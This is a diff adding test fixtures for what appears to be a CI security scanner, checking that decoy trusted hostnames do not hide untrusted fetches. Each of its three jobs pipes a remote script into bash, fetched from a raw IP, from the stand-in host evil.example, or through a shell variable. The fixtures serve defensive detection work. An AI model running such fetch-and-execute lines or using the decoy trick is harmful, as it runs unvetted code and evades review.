@@ -1,0 +1,22 @@
+# violation: the visible-line trust decision reads only each curl/wget
+# command's own text, from the curl/wget word up to the next `;`, `|`,
+# `&`, or the end of the line, mirroring the substitution family. A
+# decoy hostname sitting elsewhere on the line, whether before the real
+# fetch or after it, is not part of the fetch command's own text and
+# must never launder an untrusted fetch, including one whose only
+# visible target is a raw IP, or one whose real target is hidden behind
+# a shell variable with just the decoy left in plain sight.
+decoy_echo_then_untrusted_ip:
+  image: alpine:3.19
+  script:
+    - echo https://firebase.tools/x; curl -s http://10.1.2.3/x.sh | bash
+
+decoy_echo_then_untrusted_host:
+  image: alpine:3.19
+  script:
+    - echo firebase.tools; curl -s http://evil.example/x.sh | bash
+
+decoy_after_pipe_real_target_in_variable:
+  image: alpine:3.19
+  script:
+    - curl -fsSL "$REMOTE_HOST" | bash && echo installed via firebase.tools
